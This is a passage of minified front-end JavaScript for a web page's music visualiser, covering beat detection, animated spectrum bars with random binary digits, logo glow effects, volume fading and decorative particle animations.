s=document.getElementById("logo"),a=(Math.random()-.5)*n,c=(Math.random()-.5)*n;s.style.transform=`translate(${a}px, ${c}px) rotate(${i}deg)`;let l=25+t*25,d=.6+t*.4;s.style.filter=`drop-shadow(0 0 ${l}px rgba(0, 162, 255, ${d}))`;let m=e>.5?.2:.25;t>m&&Math.random()>.75&&se(i)}}function ge(t,e,o){return Math.round(t/(e/2)*(o/2))}function ut(){if(!y||!v)return!1;y.getByteFrequencyData(v);let t=x.sampleRate,e=ge(1500,t,y.fftSize),o=ge(2250,t,y.fftSize),n=0,i=Math.max(1,o-e+1);for(let r=e;r<=o&&r<v.length;r++)n+=v[r];let s=n/i,a=188,c=Date.now();return s>a&&c-me>25?(me=c,!0):!1}function ft(){if(!L.length)return!1;let t=Date.now(),e=b(),o,n,i,s;I==="high"?(o=.35,n=7/10,i=50,s=250):(o=.45,n=9/10,i=100,s=300);let a=L.length,c=Math.floor(a*.25),r=Math.floor(a*o),l=L.slice(c,r),d=0;l.forEach(w=>{w.classList.contains("active")&&d++});let m=Math.max(1,Math.ceil(l.length*n)),g=d>=m;return R.push({time:t,isActive:g}),R=R.filter(w=>t-w.time<=i),R.filter(w=>w.isActive).length>0&&t-fe>s?(fe=t,!0):!1}function gt(){let t=document.getElementById("bgmAudio");if(!t.duration||!B||!p)return;let e=t.currentTime/t.duration,n=p.viewBox.baseVal.width||1e3;B.setAttribute("width",n*e)}function ae(){let t=document.getElementById("binarySpectrum"),e=b(),o=e.spectrumBarCount,n=e.spectrumBarWidth;if(t.innerHTML="",L=[],f&&o>10){let a=function(){let c=Math.min(i+s,o);for(let r=i;r<c;r++){let l=document.createElement("div");if(l.className="spectrum-bar",l.style.left=r*(100/o)+"%",l.style.height="0px",l.style.width=n+"px",e.enableBinaryDigits){let d=document.createElement("div");d.className="binary-digits",f&&I==="medium"&&d.classList.add("mobile-medium-digits");let m="",g=Math.floor(Math.random()*12)+8;for(let u=0;u<g;u++)m+=Math.random()>.5?"1":"0";d.textContent=m,l.appendChild(d)}t.appendChild(l),L.push(l)}i=c,i<o&&requestAnimationFrame(a)},i=0,s=Math.max(1,Math.floor(o/4));requestAnimationFrame(a)}else for(let i=0;i<o;i++){let s=document.createElement("div");if(s.className="spectrum-bar",s.style.left=i*(100/o)+"%",s.style.height="0px",s.style.width=n+"px",e.enableBinaryDigits){let a=document.createElement("div");a.className="binary-digits",f&&I==="medium"&&a.classList.add("mobile-medium-digits");let c="",r=Math.floor(Math.random()*12)+8;for(let l=0;l<r;l++)c+=Math.random()>.5?"1":"0";a.textContent=c,s.appendChild(a)}t.appendChild(s),L.push(s)}}function xe(){if(!y||!C)return;y.getByteFrequencyData(v),A&&M&&M.postMessage({type:"spectrumData",data:Array.from(v)});let t=x.sampleRate,e=document.getElementById("dataStreams"),o=document.getElementById("logoContainer"),n=document.getElementById("logo"),i=b();C&&i.enableDataStreamGlitch?(e.classList.remove("glitch-beat"),e.classList.add("glitch-subtle")):e.classList.remove("glitch-subtle","glitch-beat");let s=ft(),a=ut();s&&!P&&i.enableLogoBeats?(P=!0,o.classList.add("heavy-beats"),o.classList.add("activity"),dt(),[-12,-8,-4,0,4,8,12].forEach((r,l)=>{setTimeout(()=>se(r),l*20)}),setTimeout(()=>{P=!1,o.classList.remove("heavy-beats"),o.classList.remove("activity")},200)):a&&!H&&!P&&i.enableLogoBeats&&(H=!0,o.classList.add("activity"),n.style.animation="beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards",[-8,-4,0,4,8].forEach((r,l)=>{setTimeout(()=>se(r),l*30)}),lt(1),setTimeout(()=>{H=!1,n.style.animation="",o.classList.remove("activity")},400),i.enableDataStreamGlitch&&(e.classList.remove("glitch-subtle"),e.classList.add("glitch-beat"),setTimeout(()=>{C&&(e.classList.remove("glitch-beat"),e.classList.add("glitch-subtle"))},250))),k?I==="low"?(e.style.setProperty("--egg-glow-radius","80px"),e.style.setProperty("--egg-glow-filter-blur","10px"),e.style.setProperty("--egg-glow-opacity","0.16"),e.style.setProperty("--egg-glow-duration","1.1s"),e.style.setProperty("--egg-highlight-brightness","1.35"),e.style.setProperty("--egg-highlight-saturate","1.2"),e.classList.add("egg-glow"),s&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},200))):I==="medium"?(e.style.setProperty("--egg-glow-radius","140px"),e.style.setProperty("--egg-glow-filter-blur","18px"),e.style.setProperty("--egg-glow-opacity","0.20"),e.style.setProperty("--egg-glow-duration","1.6s"),e.style.setProperty("--egg-highlight-brightness","1.75"),e.style.setProperty("--egg-highlight-saturate","1.45"),e.classList.add("egg-glow"),s&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},180))):(e.style.setProperty("--egg-glow-radius","200px"),e.style.setProperty("--egg-glow-filter-blur","22px"),e.style.setProperty("--egg-glow-opacity","0.24"),e.style.setProperty("--egg-glow-duration","2.0s"),e.style.setProperty("--egg-highlight-brightness","1.95"),e.style.setProperty("--egg-highlight-saturate","1.6"),e.classList.add("egg-glow"),(s||a)&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},140))):(e.classList.remove("egg-glow","egg-highlight"),e.style.removeProperty("--egg-glow-radius"),e.style.removeProperty("--egg-glow-filter-blur"),e.style.removeProperty("--egg-glow-opacity"),e.style.removeProperty("--egg-glow-duration"),e.style.removeProperty("--egg-highlight-brightness"),e.style.removeProperty("--egg-highlight-saturate")),mt(),pt(v),gt(),C&&requestAnimationFrame(xe)}function pt(t){if(!L.length)return;let e=L.length,o=Math.floor(t.length*.85),n=Math.floor(o/e);for(let i=0;i<e;i++){let s=i*n,a=t[s]||0,c=Math.max(5,a/255*100),r=L[i];r.classList.remove("stopping"),r.style.height=c+"px";let l=b();if(l.enableSpectrumHighlight&&(a>120?r.classList.add("active"):r.classList.remove("active"),l.enableBinaryDigits&&Math.random()>.92)){let d=r.querySelector(".binary-digits");if(d){let m="",g=Math.floor(Math.random()*12)+8;for(let u=0;u<g;u++)m+=Math.random()>.5?"1":"0";d.textContent=m}}}}function Se(){document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),L.forEach((e,o)=>{e.classList.add("stopping"),e.classList.remove("active"),setTimeout(()=>{e.style.height="0px",setTimeout(()=>{let n=e.querySelector(".binary-digits");n&&(n.textContent="")},400)},o*20)})}function N(t){let e=document.getElementById("audioStatus");switch(e.classList.remove("blink","show","hidden"),t){case"initial":e.textContent="\u70B9\u51FB LOGO \u64AD\u653E BGM",e.classList.add("blink");break;case"playing":e.classList.add("hidden");break;case"paused":e.textContent="\u70B9\u51FB LOGO \u7EE7\u7EED\u64AD\u653E",e.classList.add("show");break;default:e.classList.add("hidden")}}function ht(){let t=document.getElementById("bgmAudio"),e=document.getElementById("logoContainer"),o=document.getElementById("logo");if(C)C=!1,t.pause(),e.classList.remove("playing","activity","heavy-beats"),N("paused"),o.style.transform="",o.style.animation="",H=!1,P=!1,R=[],O(),requestAnimationFrame(()=>{Se(),A&&M&&M.postMessage({type:"stop"})});else{if(!x&&!it()){N("initial");return}x.state==="suspended"&&x.resume(),t.play().then(()=>{C=!0,e.classList.add("playing"),N("playing"),document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),xe()}).catch(n=>{N("initial")})}}function yt(){let t=document.getElementById("logoContainer"),e=document.getElementById("logo");C=!1,t.classList.remove("playing","activity","heavy-beats"),e.style.transform="",e.style.animation="",H=!1,P=!1,R=[],B&&B.setAttribute("width","0"),O(),requestAnimationFrame(()=>{Se()}),N("initial")}var pe;window.addEventListener("resize",()=>{clearTimeout(pe),pe=setTimeout(()=>{f=window.innerWidth<768,ae(),X()},300)});document.addEventListener("visibilitychange",function(){let t=document.getElementById("bgmAudio");if(document.hidden&&C){let e=t.volume,o=.15,n=600,i=20,s=(e-o)/i,a=n/i,c=0,r=setInterval(()=>{c++,t.volume=Math.max(o,e-s*c),c>=i&&(clearInterval(r),t.volume=o)},a)}else if(!document.hidden&&C){let e=t.volume,o=1,n=350,i=20,s=(o-e)/i,a=n/i,c=0,r=setInterval(()=>{c++,t.volume=Math.min(o,e+s*c),c>=i&&(clearInterval(r),t.volume=o)},a)}});function wt(){let t=Date.now();if(document.querySelector(".tech-particle-burst")||t-le<ze)return;le=t;let e=document.createElement("div");e.className="tech-particle-burst",document.body.appendChild(e);let n=document.getElementById("mainFooter").getBoundingClientRect(),i=n.top,s=n.left,a=n.width,r=b().particleCount;for(let l=0;l<r;l++){let d=document.createElement("div");d.className="tech-particle";let m=s+Math.random()*a,g=i+Math.random()*8;d.style.left=m+"px",d.style.top=g+"px",d.style.animationDelay=Math.random()*.4+"s";let u=2+Math.random()*3;d.style.width=u+"px",d.style.height=u+"px";let w=["#00e4ff","#00a2ff","#66ccff","#0099ff","#007acc","#4a90e2"],h=w[Math.floor(Math.random()*w.length)];d.style.background=h,d.style.boxShadow=`0 0 8px ${h}, 0 0 16px ${h}80`;let re=(Math.random()-.5)*20;d.style.setProperty("--horizontal-offset",re+"px"),e.appendChild(d)}setTimeout(()=>{e.parentNode&&e.parentNode.removeChild(e)},1500)}var K=null,E=null;function bt(){Be(),E=document.createElement("div"),E.className="easter-egg-particle-container",E.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1002;
        overflow: hidden;
    `,document.body.appendChild(E),K=setInterval(()=>{vt()},800)}function Be(){K&&(clearInterval(K),K=null),E&&(E.parentNode&&E.parentNode.removeChild(E),E=null)}function vt(){if(!E)return;let t=document.createElement("div");t.className="easter-egg-particle";let e=Math.random()*window.innerWidth,o=window.innerHeight-Math.random()*20;t.style.left=e+"px",t.style.top=o+"px";let n=(Math.random()-.5)*40;t.style.setProperty("--horizontal-offset",n+"px");let i=1.5+Math.random()*2.5;t.style.width=i+"px",t.style.height=i+"px";let s=["#00e4ff","#00a2ff","#66ccff","#0099ff","#33bbff","#00ccff"],a=s[Math.floor(Math.random()*s.length)];t.style.background=a,t.style.boxShadow=`0 0 4px ${a}, 0 0 8px rgba(0, 228, 255, 0.3)`,t.style.animation="easterEggParticleFloat 6s ease-out forwards",E.appendChild(t),setTimeout(()=>{t.parentNode&&t.parentNode.removeChild(t)},6e3)}})();
